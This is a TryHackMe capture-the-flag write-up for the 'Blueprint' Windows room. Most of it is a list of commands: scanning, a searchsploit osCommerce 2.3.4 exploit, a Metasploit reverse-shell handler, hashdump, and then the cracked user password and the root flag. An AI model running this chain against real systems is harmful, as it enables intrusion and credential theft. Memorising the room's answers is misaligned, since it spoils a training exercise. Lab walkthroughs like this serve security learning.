Blueprint

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната []() 

Всего 1 заданиe:
## Задание 1
Хватит ли у вас сил взломать эту машину с Windows?

It might take around 3-4 minutes for the machine to boot.

### Ответьте на вопросы ниже
Расшифрован хэш NTLM пользователя "Lab"
```commandline
sudo nmap -sS -sV -sC -Pn <IP>
gobuster dir -u http://<IP> - w /usr/share/wordlists/dirb/big.txt
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>
http://<ip>
http://<ip>:8080
searchsploit oscommerce 2.3.4
./searchsploit -m 44374
msfconsole -q
use multi/handler
set payload windows/shell/reverse_tcp
set lhost <IP>
run
python exploit.py 
whoami
nt authority\system
sessions
sessions -u 1
sessions
sessions 2
getuid
hashdump
```
```commandline
googleplus
```
корень.txt
```commandline
cd /users/administrator/desktop
ls
cat root.txt.txt
```
```commandline
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)